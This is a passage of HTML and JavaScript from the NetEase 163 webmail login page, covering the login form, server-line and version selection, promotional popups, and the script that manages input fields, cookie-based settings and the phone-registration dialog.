						<a class="whatAutologin" href="http://help.163.com/09/1217/10/5QNRFLMM00753VB8.html?b08abI1" tabindex="4" target="_blank" title="&#20160;&#20040;&#26159;&#33258;&#21160;&#30331;&#24405;">&#20160;&#20040;&#26159;&#33258;&#21160;&#30331;&#24405;</a>
						-->
					</div>
					<div class="forgetPwdLine">						
						<a class="forgetPwd" href="http://reg.163.com/getpasswd/RetakePassword.jsp?from=mail163" target="_blank" title="&#25214;&#22238;&#23494;&#30721;">&#24536;&#35760;&#23494;&#30721;&#20102;?</a>
					</div>

				</div>
				<div class="loginFormBtn">
					<button id="loginBtn" class="btn btn-login" tabindex="6" type="submit">&#30331;&nbsp;&nbsp;&#24405;</button>
					<a id="lfBtnReg" class="btn btn-reg" href="http://reg.email.163.com/mailregAll/reg0.jsp?from=163mail_right" target="_blank" tabindex="7">&#27880;&nbsp;&nbsp;&#20876;</a>
					<a id="lfBtnReg2" class="btn btn-reg" href="http://e.mail.163.com/mobilemail/home.do?from=163mail" target="_blank" tabindex="7">&#27880;&nbsp;&nbsp;&#20876;</a>
				</div>
				<div class="loginFormConf">
					<div class="loginFormVer">
						&#29256;&#26412;: <a id="styleConf" href="javascript:void(0);">&#40664;&#35748;&#29256;&#26412; <b class="ico ico-arr ico-arr-d"></b></a>
					</div>
					<div class="loginFormService" id="loginSSL">&#27491;&#20351;&#29992;SSL&#30331;&#24405;</div>
					<div class="loginFormService" id="AllSSL" style="display:none">
						<input title="&#20840;&#31243;SSL" class="loginFormCbx" type="checkbox" id="AllSSLCkb" />&nbsp;<label style="vertical-align:baseline;" for="AllSSLCkb">&#20840;&#31243;SSL</label>
					</div>
					<div class="loginFormCheckInner" style="display:none">
						<input class="loginFormCbx loginFormSslCbx" type="checkbox" tabindex="5" title="SSL&#23433;&#20840;&#30331;&#24405;" id="SslLogin" checked="checked" /><label class="loginFormSslText" for="SslLogin">&nbsp;<span style="font-family:verdana;">SSL</span>&#23433;&#20840;&#30331;&#24405;</label>
					</div>
					<div class="loginFormService" style="display:none">
						<a id="selectLocationTips" href="javascript:void(0);" onClick="fSelectLoaction('show');return false;">&#30331;&#24405;&#36895;&#24230;&#22826;&#24930;? <b class="ico ico-arr ico-arr-d"></b></a>
						<span id="selectLocationTipsDone">
							<a href="javascript:void(0);" onClick="fSelectLoaction('show');return false;">
								<span>&#26381;&#21153;&#22120;: <span id="selectLocation">&#30005;&#20449;</span></span><b class="ico ico-arr ico-arr-d"></b>
							</a>
						</span>
					</div>
					<div id="styleConfBlock" class="loginFormVerList unishadow">
						<ul>
							<li><a id="styleconf-1" class="verSelected" href="javascript:void(0);" onClick="indexLogin.setStyle(-1)">&#40664;&#35748;&#29256;&#26412;</a></li>
							<li><a id="styleconf7" href="javascript:void(0);" onClick="indexLogin.setStyle(7)">&#32593;&#26131;&#37038;&#31665;<span class="fontWeight">6.0</span>&#29256;</a></li>
							<li><a id="styleconf6" href="javascript:void(0);" onClick="indexLogin.setStyle(6)">&#32593;&#26131;&#37038;&#31665;<span class="fontWeight">6.0</span>&#31616;&#32422;&#29256;</a></li>
							<li><a id="styleconf5" href="javascript:void(0);" onClick="indexLogin.setStyle(5)">&#32593;&#26131;&#37038;&#31665;<span class="fontWeight">5.0</span>&#29256;</a></li>
							<li><a id="styleconf3" href="javascript:void(0);" onClick="indexLogin.setStyle(3)">&#32593;&#26131;&#37038;&#31665;<span class="fontWeight">5.0</span>&#31616;&#32422;&#29256;</a></li>
						</ul>
					</div>
					<div id="locationTest" class="unishadow">
						<div class="locationTestTitle">
							<h4>&#27979;&#35797;&#24182;&#36873;&#25321;&#26368;&#20339;&#26381;&#21153;&#22120;</h4>
							<a class="locationTestTitleClose" href="javascript:void(0);" onClick="fSelectLoaction();return false;">>&#20851;&#38381;</a>
						</div>
						<div class="locationTestList">
							<ul>
								<li>
									<a id="locationHref0" href="javascript:void(0);" onClick="fLocationChoose('t');return false;">
									&#30005;&nbsp;&nbsp;&nbsp;&#20449;
									<br/><span class="locationTestEach" id="locationTest0"></span>
									</a>
								</li>
								<li style="border-left:1px solid #d5dbe2;border-right:1px solid #d5dbe2;">
									<a id="locationHref1" href="javascript:void(0);" onClick="fLocationChoose('c');return false;">
									&#32852;&nbsp;&nbsp;&nbsp;&#36890;
									<br/><span class="locationTestEach" id="locationTest1"></span>
									</a>
								</li>
								<li>
									<a id="locationHref2" href="javascript:void(0);" onClick="fLocationChoose('e');return false;">
									&#25945;&#32946;&#32593;
									<br/><span class="locationTestEach" id="locationTest2"></span>
									</a>
								</li>
							</ul>
						</div>
					</div>
				</div>
			</form>
			<div id="loginByYX">
				<img id="yxCode" width="85" height="85" src="" />
				<div id="yxCodeRefresh" style="display:none;">
					<div class="yxCode-mask"></div>
					<a id="refeshYXCodeBtn" class="yxCode-btn" href="javascript:void(0)">&#21047; &#26032;</a>
				</div>
				<div id="yxCodeTxt" class="loginByYX-txt"></div>
				<form id="codeLoginForm" method="post" action="" autocomplete="off" target="_self"></form>
			</div>
			<div class="ext" id="loginExt">
				<div id="extVerSelect"><a href="http://ipad.mail.163.com/index.htm?dv=ipad">&#36866;&#37197;iPad&#29256;&#26412;</a>&nbsp;|&nbsp;<a href="http://smart.mail.163.com/index.htm?dv=smart">&#25163;&#26426;&#26234;&#33021;&#29256;</a>&nbsp;|&nbsp;&#30005;&#33041;&#29256;</div>
				<ul id="extText"></ul>
				<div id="extMobLogin">
					<h3 class="ext-tt"><a href="http://yixin.im/?from=163mailtab" target="_blank">&#26377;&#25163;&#26426;&#21495;&#30721;&#37038;&#31665;&#65292;&#23601;&#21487;&#20197;&#30452;&#25509;&#30331;&#24405;&#26131;&#20449;</a></h3>
					<p>
						<a href="http://yixin.im/?from=163mailtab" target="_blank">
							<span>&#26080;&#38656;&#27880;&#20876;</span><var>|</var>&#37038;&#20214;&#21040;&#36798;&#20813;&#36153;&#25552;&#37266;<var>|</var>&#36865;2G&#32593;&#30424;
						</a>
					</p>
				</div>
				<div id="extMobLogin2">
					<button class="btn btn-moblogin2" id="extBtnMoblogin" type="button">&#36824;&#27809;&#35774;&#32622;&#25163;&#26426;&#21495;&#30331;&#24405;&#65311;</button>
					<div class="setMobLoginInfo">&#35774;&#32622;&#21518;&#65292;&#21487;&#29992;&#25163;&#26426;&#21495;&#30452;&#25509;&#30331;&#24405;&#37038;&#31665;&#65288;&#23436;&#20840;&#20813;&#36153;&#65289;</div>
				</div>
			</div>
		</div>
	</div>
</section>

<footer id="footer" class="footer">
	<div class="footer-inner" id="footerInner">
		<a class="footerLogo" href="http://www.163.com/" target="_blank"><img src="http://mimg.127.net/logo/netease_logo.gif" alt="&#32593;&#26131;NetEase"/></a>
		<a id="KX_IMG" style="position:absolute;right:50px;top:24px;" href="https://ss.knet.cn/verifyseal.dll?sn=e12051044010020841301459&ct=df&pa" target="_blank">
			<img src="http://mimg.127.net/logo/knet.png" alt="&#21487;&#20449;&#32593;&#31449;&#65292;&#36523;&#20221;&#39564;&#35777;" />
		</a>
		<nav class="footerNav">
			<a href="http://corp.163.com/index_gb.html" target="_blank">&#20851;&#20110;&#32593;&#26131;</a><a href="http://mail.163.com/html/mail_intro" target="_blank">&#20851;&#20110;&#32593;&#26131;&#20813;&#36153;&#37038;</a><a href="http://mail.blog.163.com/" target="_blank">&#37038;&#31665;&#23448;&#26041;&#21338;&#23458;</a><a href="http://help.mail.163.com" target="_blank">&#23458;&#25143;&#26381;&#21153;</a><a style="margin-right:10px" href="http://corp.163.com/gb/legal/legal.html" target="_blank">&#38544;&#31169;&#25919;&#31574;</a>|<span class="copyright">&#32593;&#26131;&#20844;&#21496;&#29256;&#26435;&#25152;&#26377;&copy;1997-2014</span>
		</nav>
	</div>
</footer>
<!--&#36974;&#32617;-->
<div id="mask" class="mask" style="display:none;"></div>
<!--&#25163;&#26426;&#21495;&#30721;&#27880;&#20876;&#24377;&#26694;-->
<div id="phoneRegDiv" class="dialogbox" style="display:none;">
	<div class="hd">
		<h3>&#35774;&#32622;&#25163;&#26426;&#21495;&#30331;&#24405;</h3>
		<a id="phoneRegDivClose" href="javascript:;" class="btn btn-close" title="&#20851;&#38381;">&#20851;&#38381;</a>
		<span class="rc rc-l"></span>
		<span class="rc rc-r"></span>
	</div>
	<div class="bd">
		<iframe id="phoneRegFrame" src="about:blank" style="border:0">&#35774;&#32622;&#25163;&#26426;&#21495;&#30331;&#24405;iframe</iframe>
	</div>
</div>
<!--&#30331;&#24405;&#25552;&#31034;&#24377;&#26694;-->
<div class="enhttp" style="display:none" id="enhttpblock">
	<div class="enhttpbox">
		<div class="topborder"></div>
		<div class="ct">
			<div class="inner">
				<p class="txt-tips">&#30331;&#24405;&#36807;&#31243;&#26377;&#28857;&#24930;&#21734;&#65292;&#21487;&#33021;&#26159;&#30001;&#20110;&#32593;&#32476;&#38382;&#39064;&#36896;&#25104;&#30340;&#12290;</p>
				<p id="enhttpTips" class="txt-normal"><span id="backwards">3</span>&nbsp;&#31186;&#21518;&#33258;&#21160;&#23581;&#35797;&#26222;&#36890;&#21152;&#23494;&#26041;&#24335;&#30331;&#24405;</p>
				<p class="txt-normal"><a id="idLoginBtn" class="httplogin" href="javascript:void(0)">&#30830;&nbsp;&nbsp;&#23450;</a></p>
				<p class="txt-line"></p>
				<p class="txt-advice">&#26080;&#27861;&#30331;&#24405;&#37038;&#31665;&#65311;<a class="txt-advicelink" href="http://zhidao.mail.163.com/zhidao/lfeedback.jsp" target="_blank">&#24847;&#35265;&#21453;&#39304;&gt;&gt;</a></p>
			</div>
		</div>
		<div class="bottomborder"></div>
	</div>
	<iframe class="httploginframe" src="about:blank" id="frameforlogin" name="frameforlogin" style="overflow:hidden;border:0">&#30331;&#24405;iframe</iframe>
</div>
<!--&#39318;&#39029;&#35780;&#20998;&#24377;&#26694;-->
<div id="scoreIndexPop">
	<iframe id="scoreIndexPopIfm" src="about:blank" frameborder="0" scrolling="no" allowTransparency="allowtransparency"></iframe>
</div>
<!--&#20113;&#38899;&#20048;&#24377;&#26694;-->
<div id="yunMusic">
	<div id="yunMusicBackground"></div>
	<div id="yunMusicText1">
		&#38750;&#24120;&#24863;&#35874;&#24744;&#30340;&#25903;&#25345;&#65281;&#24744;&#23558;&#25910;&#21040;<strong>&#19968;&#26465;&#30701;&#20449;</strong>&#65292;&#28857;&#20987;&#30701;&#20449;&#20869;&#38142;&#25509;&#20813;&#36153;&#19979;&#36733;&#20840;&#26032;&#38899;&#20048;&#36719;&#20214;<a style="color:#dd0000" href="http://music.163.com/?act=cmad_20130517_08" target="_blank">&nbsp;<img src="http://mimg.127.net/index/163/effects/130523_music.png" alt="&#32593;&#26131;&#20113;&#38899;&#20048;" />&nbsp;&#32593;&#26131;&#20113;&#38899;&#20048;</a>&#12290;
	</div>
	<div id="yunMusicText2">
		&#26126;&#26143;&#31169;&#25151;&#27468;&#21333;&#12289;320K&#39640;&#21697;&#36136;&#38899;&#20048;&#65292;&#23613;&#22312;&#32593;&#26131;&#20113;&#38899;&#20048;&#65281;
	</div>
	<a id="yunMusicConfirm" href="http://music.163.com/?act=cmad_20130517_08" target="_blank">&#20307;&#39564;&#20113;&#38899;&#20048;</a>
	<a id="yunMusicClose" href="javascript:void(0);">X</a>
</div>

<script id="jsExec" type="text/javascript">
/* &#20840;&#23616;&#21464;&#37327; */
// &#20445;&#23384;UD&#25968;&#25454;&#65292;&#29992;&#20110;&#32531;&#23384;
var gAdUserPropertyData;
// &#23450;&#20041;&#24191;&#21578;&#32032;&#26448;&#20840;&#23616;&#21464;&#37327;
var gAdResData = {
	// 1&#12289;&#25163;&#26426;&#21495;&#30721;
	mobile : function(){
		return nRandom = 0;
	},
	// 2&#12289;&#26131;&#20449;
	yixin : function(){
		return nRandom = 1;
	},
	// 3&#12289;&#20113;&#38899;&#20048;
	music : function(){
		return nRandom = 3;
	},
	// 4&#12289;&#20113;&#38405;&#35835;
	read : function(){
		return nRandom = 4;
	},
	// 5&#12289;&#26032;&#38395;&#23458;&#25143;&#31471;
	news : function(){
		return nRandom = 5;
	}
};

//&#38169;&#35823;&#25552;&#31034;&#35821;
var gErrorInfo = {
	'noId' : {
		'title' : '&#35831;&#20808;&#36755;&#20837;&#24744;&#30340;&#37038;&#31665;&#24080;&#21495;'
	},
	'noPhone' : {
		'title' : '&#35831;&#20808;&#36755;&#20837;&#24744;&#30340;&#25163;&#26426;&#21495;&#30721;&#37038;&#31665;&#24080;&#21495;'
	},
	'noPw' : {
		'title' : '&#35831;&#36755;&#20837;&#24744;&#30340;&#23494;&#30721;'
	},
	'inputWrong' : {
		'title' : '&#24080;&#21495;&#25110;&#23494;&#30721;&#38169;&#35823;',
		'info' 	: '1. &#35831;&#26816;&#26597;&#24080;&#21495;&#25340;&#20889;&#65292;&#26159;&#21542;&#36755;&#20837;&#26377;&#35823;<br />2. &#33509;&#24080;&#21495;&#38271;&#26399;&#26410;&#30331;&#24405;&#65292;&#21487;&#33021;&#24050;&#34987;&#27880;&#38144;&#65292;&#35831;<a href="http://reg.email.163.com/unireg/call.do?cmd=register.entrance&from=163mail_right" target="_blank">&#37325;&#26032;&#27880;&#20876;</a><br />3. &#33509;&#24744;&#24536;&#35760;&#23494;&#30721;&#65292;&#35831;<a href="http://reg.163.com/getpasswd/RetakePassword.jsp?from=mail163" target="_blank">&#25214;&#22238;&#23494;&#30721;</a><br/>4. &#33509;&#24744;&#38656;&#35201;&#38145;&#23450;&#27492;&#24080;&#21495;&#65292;&#35831;<a href="http://reg.163.com/lockuser/LockUserByPingma_0.jsp" target="_blank">&#28857;&#20987;&#36825;&#37324;</a><br/>5. &#33509;&#25163;&#26426;&#21495;&#30721;&#37038;&#31665;&#30340;&#25163;&#26426;&#21495;&#24050;&#26356;&#25442;&#65292;&#21487;<a href="http://reg.163.com/mobilealias/findBindHistoryIndex.do" target="_blank">&#25214;&#22238;&#21407;&#24080;&#21495;</a>'
	},
	'idLocked' : {
		'title' : '&#25265;&#27465;&#65281;&#24744;&#30340;&#24080;&#21495;&#24050;&#34987;&#38145;&#23450;&#65292;<br />&#26242;&#26102;&#26080;&#27861;&#30331;&#24405;&#12290;'
	},
	'systemBusy' : {
		'title' : '&#36755;&#20837;&#23494;&#30721;&#12290;'
	},
	'loginWrong' : {
		'title' : '&#24744;&#30340;&#30331;&#24405;&#36807;&#20110;&#39057;&#32321;&#65292;&#35831;&#31245;&#21518;&#20877;&#35797;&#12290;'
	},
	'loginTimeout' : {
		'title' : '&#30331;&#24405;&#36229;&#26102;&#65281;',
		'info' 	: '&#24403;&#21069;&#37038;&#31665;&#30331;&#24405;&#29366;&#24577;&#24050;&#22833;&#25928;, &#35831;&#37325;&#26032;&#30331;&#24405;&#12290;'
	}
};

var oStyle = {
	value	:	'-1'
};

(function(window){
	window.indexLogin = {
		init 					: fInit,
		setUserInfo 			: fSetUserInfo,
		// &#36755;&#20837;&#30456;&#20851;
		initInputBox 			: fInitInputBox,
		focusInputBox 			: fFocusInputBox,
		idInputEvent 			: fIdInputEvent,
		checkPw 				: fCheckPw,
		checkInputAlways 		: fCheckInputAlways,
		handleString 			: fHandleString,
		showPhoneReg 			: fShowPhoneReg,
		// tab&#20999;&#25442;&#30456;&#20851;
		switchTab 				: fSwitchTab,
		switchTabTimeout 		: fSwitchTabTimeout,
		setbSwitchTabTimeout 	: fSetbSwitchTabTimeout,
		// &#30331;&#24405;&#30456;&#20851;
		setStyle 				: fSetStyle,
		submitForm 				: fSubmitForm,
		showTheHttpLogin 		: fShowTheHttpLogin,
		showError 				: fShowError,
		hideError 				: fHideError,
		vericalAlignBody 		: fVericalAlignBody,
		// &#20027;&#39064;&#22270;&#30456;&#20851;
		oTheme 					: {},
		adGetUdData 			: fAdGetUdData,
		initThemes 				: fInitThemes,
		showThemes				: fShowThemes,
		themeShowLog 			: fThemeShowLog,
		scoreIndex 				: fScoreIndex,
		adSendMsg 				: fAdSendMsg,
		musicCallback			: fMusicCallback,
		// &#20854;&#23427;
		KX 						: fKX,
		tmpSwitchLog 			: fTmpSwitchLog
	};

	var oId, oIdL, oPw, oPwL;
	var nDomainWidth = 80;
	var tab1Cls = 'login tab-1',
		tab2Cls = 'login tab-2';
	var ntabOn = 1,
		sTmpId,sTmpPwd,
		sTmpMob = '',
		sTmpMobPwd = '',
		sTmpInput = '',
		sTmpMobInput = '';
	var bSwitchTabTimeout = true;

	//&#30331;&#24405;&#27969;&#31243;
	var sLoginFunc = 'ssl',
		bIsFirstLog = true,
		sCoremailCookie = '';

	// starttime &#30331;&#24405;&#26102;&#38388;&#32479;&#35745;
	var bStartTime = true;

	function fInit(){
		var me = this;

		oId = $id('idInput');
		oIdL = $id('idInputLine');
		oPw = $id('pwdInput');
		oPwL = $id('pwdInputLine');

		window.frames['frameforlogin'].location.href = 'about:blank';
		// &#35835;&#21462;url&#21028;&#26029;&#26159;&#21542;&#26377;&#38169;&#35823;&#20449;&#24687;
		var sErrKey = 'errorType';
		if(window.location.href.indexOf('?' + sErrKey) > -1){
			var sErrorCode = fGetQuery(sErrKey);
			me.showError(sErrorCode);
		}

		// tab&#25511;&#21046;
		if(gbForcepc){
			tab1Cls = 'login tab-1 tab-11';
		}
		$id('loginBlock').className = tab1Cls;

		var oTab2 = $id('lbMob');
		fEventListen(oTab2, 'mouseover', me.switchTabTimeout);
		fEventListen(oTab2, 'mouseout', me.setbSwitchTabTimeout);

		if((window.location.href.indexOf('tab2') > -1) || fGetQueryHash('tab') == '2'){
			me.switchTab(); // &#25163;&#26426;&#21495;&#30721;&#37038;&#31665;
			me.tmpSwitchLog(); // &#20020;&#26102;&#32479;&#35745;
		}

		me.focusInputBox();

		me.setUserInfo();
		me.initInputBox();
		me.initThemes();
		me.scoreIndex();

		// &#32465;&#23450;&#25552;&#20132;&#34920;&#21333;&#20107;&#20214;
		// fEventListen($id('login163'), 'submit', me.submitForm);
		$id('login163').onsubmit = function(){
			return me.submitForm();
		};

		// &#22823;&#20889;&#38145;&#23450;&#24320;&#21551;&#21028;&#26029;
		var oCapsLockTest = new CapsLock({
			el : oPw,
			change : function(bFlag){
				var oHint = $id('capsLockHint');
				if(bFlag){
					oHint.style.display = 'block';
				}else{
					oHint.style.display = 'none';
				}
			}
		});
		
		me.KX(); // &#21487;&#20449;&#26631;&#35782;
	}

	/**
	 * &#26681;&#25454;cookie&#39044;&#35774;&#29992;&#25143;&#20449;&#24687;
	 */
	function fSetUserInfo(){
		var me = this;
		// &#37038;&#31665;&#29256;&#26412;&#35774;&#23450;
		var sLogType = fGetCookie('logType');
		if(sLogType == '' || sLogType == null){
			sLogType = gUserInfo.style;
		}
		switch(sLogType){
			case '7':
				fSetStyle(7); // js6
				break;
			case '6':
				fSetStyle(6); // jy6
				break;
			case '5':
				me.setStyle(5); // js5
				break;
			case 'jy5':
			case '3':
				me.setStyle(3); // jy5
				break;
			default :
				me.setStyle(-1);
		}
		// &#20860;&#23481;logType&#24182;&#28165;&#38500;
		fSetCookie('logType' , '' , false);

		// &#29992;&#25143;&#21517;&#35774;&#23450;
		var sUser = gUserInfo.username,
			sUid = fGetQueryHash('uid'),
			sErrorUsername = fGetQuery('errorUsername'),
			sResult;
		if(sUser != null){
			oId.autocomplete='on';
		}else{
			oId.autocomplete='off';
		}
		try{ oId.focus(); }catch(e){}
		if((sUser != '' && sUser != null) || sErrorUsername != null){
			sResult = sUser;
			if( sUid != null ){
				sResult = fCheckAccount(sUid);
			}
			// &#38169;&#35823;&#39029;&#36339;&#36716;&#21442;&#25968;
			if(sErrorUsername != null){
				sResult = fCheckAccount(sErrorUsername);
			}
			oId.value = sResult;
			fCls(oIdL, 'showPlaceholder', 'remove');
			me.idInputEvent();
			//gMobileNumMail.getNumFromMail(oId.value);
			try{ oPw.focus(); }catch(e){}
		}
	}

	/**
	 * &#32465;&#23450;&#36755;&#20837;&#26694;&#20107;&#20214;
	 */
	function fInitInputBox(){
		var me = this;
		var oLo = $id('loginBtn'),
			oRg = $id('lfBtnReg'),
			oRg2 = $id('lfBtnReg2'),
			oIdLabel = $id('idPlaceholder'),
			oAutoTips = $id('whatAutologinTip'),
			oPwLabel = $id('pwdPlaceholder'),
			oAutoLoginWrap = $id('lfAutoLogin'),
			oAutoLoginCheckbox = oAutoLoginWrap.getElementsByTagName('b')[0],
			oRemAutoLogin = $id('remAutoLogin'),
			oAutoLoginTxt = $id('remAutoLoginTxt'),
			oStyleConf = $id('styleConf'),
			oStyleConfBlk = $id('styleConfBlock');
		var oErrorAlert = $id('errorAlert'),
			oErrorMask = $id('errorMask');
		//&#24080;&#21495;
		fEventListen(oIdL, 'mouseover', function(){
			fCls(oIdL, 'loginFormIpt-over', 'add');
		});
		fEventListen(oIdL, 'mouseout', function(){
			fCls(oIdL, 'loginFormIpt-over', 'remove');
		});
		fEventListen(oId, 'focus', function(){
			fCls(oId, 'loginFormTdIpt-focus', 'add');
			fCls(oIdL, 'loginFormIpt-focus', 'add');
		});
		fEventListen(oId, 'blur', function(){
			fCls(oIdL, 'loginFormIpt-focus', 'remove');	
			if(oId.value == ''){
				fCls(oIdL, 'showPlaceholder', 'add');
				fCls(oId, 'loginFormTdIpt-focus', 'remove');
			}else{
				oId.value = fCheckAccount(oId.value);
			}
		});

		var sEventName = '';
		var bIsIe = false;
		if(document.body.onpropertychange === null){
			sEventName = 'propertychange';
			var bIsIe = true;
		}else{
			sEventName = 'input';
			me.checkInputAlways();
		}
		var el = document.createElement('div');
		el.setAttribute('oninput', 'return;')
		if(typeof el.oninput === 'function'){
			sEventName = 'input';
			if(bIsIe){
				me.checkInputAlways();
			}
		}
		fEventListen(oId, sEventName, me.idInputEvent);
		//&#28857;&#20987;&#21452;&#20987;&#25991;&#23383;
		fEventListen(oIdLabel, 'dbclick', function(){
			oId.focus();
		});
		fEventListen(oIdLabel, 'click', function(){
			oId.focus();
		});

		//&#23494;&#30721;
		fEventListen(oPwL, 'mouseover', function(){
			fCls(oPwL, 'loginFormIpt-over', 'add');
		});
		fEventListen(oPwL, 'mouseout', function(){
			fCls(oPwL, 'loginFormIpt-over', 'remove');
		});
		fEventListen(oPw, 'focus', function(){
			fCls(oPw, 'loginFormTdIpt-focus', 'add');
			fCls(oPwL, 'loginFormIpt-focus', 'add');
		});
		fEventListen(oPw, 'blur', function(){
			fCls(oPwL, 'loginFormIpt-focus', 'remove');
			if(oPw.value == ''){
				fCls(oPwL, 'showPlaceholder', 'add');
				fCls(oPwL, 'loginFormTdIpt-focus', 'remove');
			}
		});
		fEventListen(oPw, sEventName, me.checkPw);
		//&#28857;&#20987;&#21452;&#20987;&#25991;&#23383;
		fEventListen(oPwLabel, 'dbclick', function(){
			oPw.focus();
		});
		fEventListen(oPwLabel, 'click', function(){
			oPw.focus();
		});
		//&#21313;&#22825;&#33258;&#21160;&#30331;&#24405;checkbox
		fEventListen(oAutoLoginCheckbox, 'click', function(){
			if(oRemAutoLogin.checked){
				fCls(oAutoLoginWrap, 'autoLogin-checked', 'remove');
				oRemAutoLogin.checked = false;
			}else{
				fCls(oAutoLoginWrap, 'autoLogin-checked', 'add');
				oRemAutoLogin.checked = true;
			}
		});
		fEventListen(oAutoLoginTxt, 'click', function(){
			if(oRemAutoLogin.checked){
				fCls(oAutoLoginWrap, 'autoLogin-checked', 'remove');
				oRemAutoLogin.checked = false;
			}else{
				fCls(oAutoLoginWrap, 'autoLogin-checked', 'add');
				oRemAutoLogin.checked = true;
			}
		});
		//&#21313;&#22825;&#33258;&#21160;&#30331;&#24405;&#25991;&#23383;&#25552;&#31034;
		fEventListen(oAutoLoginTxt, 'mouseover', function(){
			oAutoTips.style.display = 'block';
		});
		fEventListen(oAutoLoginTxt, 'mouseout', function(){
			oAutoTips.style.display = 'none';
		});
		//&#30331;&#24405;&#25353;&#38062;
		fEventListen(oLo, 'mouseover', function(){
			fCls(oLo, 'btn-login-hover', 'add');
		});
		fEventListen(oLo, 'mouseout', function(){
			oLo.className = 'btn btn-login';
		});
		fEventListen(oLo, 'mousedown', function(){
			fCls(oLo, 'btn-login-active', 'add');
		});
		//&#27880;&#20876;&#25353;&#38062;
		fEventListen(oRg, 'mouseover', function(){
			fCls(oRg, 'btn-reg-hover', 'add');
		});
		fEventListen(oRg, 'mouseout', function(){
			oRg.className = 'btn btn-reg';
		});
		fEventListen(oRg, 'mousedown', function(){
			fCls(oRg, 'btn-reg-active', 'add');
		});
		fEventListen(oRg, 'mouseup', function(){
			oRg.className = 'btn btn-reg';
		});
		//&#25163;&#26426;&#21495;&#30331;&#24405;tab&#27880;&#20876;&#25353;&#38062;
		fEventListen(oRg2, 'mouseover', function(){
			fCls(oRg2, 'btn-reg-hover', 'add');
		});
		fEventListen(oRg2, 'mouseout', function(){
			oRg2.className = 'btn btn-reg';
		});
		fEventListen(oRg2, 'mousedown', function(){
			fCls(oRg2, 'btn-reg-active', 'add');
		});
		fEventListen(oRg2, 'mouseup', function(){
			oRg2.className = 'btn btn-reg';
		});
		//&#29256;&#26412;&#36873;&#25321;
		fEventListen(oStyleConf, 'click', function(){
			oStyleConfBlk.style.display = 'block';
		});
		oStyleConfBlk.onmouseout = function(e){
			var oE = e || window.event;
			var that = this;
			_fE(function(){
				oStyleConfBlk.style.display = 'none';
			}, oE, that);
		};
		//&#32447;&#36335;&#36873;&#25321;
		$id('locationTest').onmouseout = function(e){
			var oE = e || window.event;
			var that = this;
			_fE(function(){
				$id('locationTest').style.display = 'none';
			}, oE, that);
		};
		//&#38459;&#27490;&#20107;&#20214;&#35302;&#21457;
		function _fE(fFunc, oE, oThat){
			var e = oE,
			relatedTarget = e.toElement || e.relatedTarget;
			while(relatedTarget && relatedTarget != oThat){
				relatedTarget = relatedTarget.parentNode;
			}
			if(!relatedTarget){
				fFunc();
			}
		}

		//&#36824;&#27809;&#35774;&#32622;&#25163;&#26426;&#21495;&#25353;&#38062;2
		fEventListen($id('extBtnMoblogin'), 'click', function(){
			me.showPhoneReg(true);
		});
		//&#25163;&#26426;&#27880;&#20876;&#26694;&#20851;&#38381;&#25353;&#38062;
		fEventListen($id('phoneRegDivClose'), 'click', function(){me.showPhoneReg(false);});
		/*//&#20851;&#38381;&#25163;&#26426;&#25552;&#31034;
		fEventListen($id('mobtips_close'), 'click', function(){gMobileNumMail.forbidden();});
		*/
	}

	/**
	 * &#36755;&#20837;&#26694;&#32858;&#28966;
	 */
	function fFocusInputBox(){
		if(oId.value != ''){
			/*if(ntabOn == 1){
				gMobileNumMail.getNumFromMail(oId.value);
			}else{
				gMobileNumMail.getMailFromNum(oId.value);
			}*/
			fCls(oIdL, 'showPlaceholder', 'remove');
			fCls(oId, 'loginFormTdIpt-focus', 'add');
			oPw.focus();
			fCls(oPwL, 'loginFormIpt-focus', 'add');
		}else{
			oId.focus();
		}
	}

	/**
	 * &#36755;&#20837;&#36229;&#38271;&#26102;&#38544;&#34255;&#21518;&#32512;&#26174;&#31034;&#21306;
	 */
	function fIdInputEvent(){
		var oShowDomain = $id('showdomain'),
			oInputTest = $id('idInputTest');
		if(oId.value == ''){
			fCls(oIdL, 'showPlaceholder', 'add');
			oInputTest.innerHTML = '';
			oShowDomain.style.width = nDomainWidth + 'px';
		}else{
			fCls(oIdL, 'showPlaceholder', 'remove');
			fCls(oId, 'loginFormTdIpt-focus', 'add');
			oInputTest.innerHTML = oId.value;
			var tmpWidth = oInputTest.offsetWidth;
			if(tmpWidth - 130 >= 0 && tmpWidth - 130 <= nDomainWidth){
				oShowDomain.style.width = nDomainWidth - (tmpWidth - 130) + 'px';
			}else if(tmpWidth - 130 < 0){
				oShowDomain.style.width = nDomainWidth + 'px';
			}else{
				oShowDomain.style.width = '0px';
			}
		}
	}

	/**
	 * &#26816;&#26597;&#23494;&#30721;&#36755;&#20837;&#26694;&#29366;&#24577;
	 */
	function fCheckPw(){
		if(oPw.value != ''){
			fCls(oPwL, 'showPlaceholder', 'remove');
			fCls(oPw, 'loginFormTdIpt-focus', 'add');
		}else{
			fCls(oPwL, 'showPlaceholder', 'add');
		}
	}

	/**
	 * &#25345;&#32493;&#26816;&#26597;&#36755;&#20837;&#26694;&#29366;&#24577;
	 */
	function fCheckInputAlways(){
		var me = this;
		window.oIntervalCheckInputAlways = setInterval(function(){
			if(oId.value != ''){
				fCls(oIdL, 'showPlaceholder', 'remove');
				fCls(oId, 'loginFormTdIpt-focus', 'add');
			}else{
				fCls(oIdL, 'showPlaceholder', 'add');
			}
			me.idInputEvent();
			me.checkPw();
		},500);
	}

	/**
	 * &#23383;&#31526;&#36716;&#25442;&#65288;&#20840;&#35282;&#36716;&#21322;&#35282;&#65292;&#20013;&#25991;&#36887;&#21495;&#36716;&#33521;&#25991;&#36887;&#21495;&#65289;
	 * @param  {[type]} s [description]
	 * @return {[type]}   [description]
	 */
	function fHandleString(s){ 
		var result = "";
		for(var i = 0; i < s.length; i++){
			if(s.charCodeAt(i)==12288){
				result += String.fromCharCode(s.charCodeAt(i)-12256);
				continue;
			}
			if(s.charCodeAt(i)>65280 && s.charCodeAt(i)<65375){
				result += String.fromCharCode(s.charCodeAt(i)-65248);
			}else{
				result += String.fromCharCode(s.charCodeAt(i));
			}
		}
		result.replace(/&#12290;/g, '.');
		return result;
	}

	/**
	 * &#27880;&#20876;&#25163;&#26426;&#21495;&#30721;&#36974;&#32617;&#19982;&#24377;&#26694;
	 * @param  {Boolean} bType &#26159;&#21542;&#25913;&#21464;&#30446;&#26631;url
	 */
	function fShowPhoneReg(bType){
		fResize();
		var sUrl = 'http://e.mail.163.com/mobilemail/maildoor/home.jsp',
			oDiv = $id('phoneRegDiv'),
			oIframe = $id('phoneRegFrame'),
			oMask = $id('mask');
		if(bType){
			if(oIframe.src != sUrl){
				oIframe.src = sUrl;
			}
		}
		oMask.style.display = oDiv.style.display = (bType ? '' : 'none');
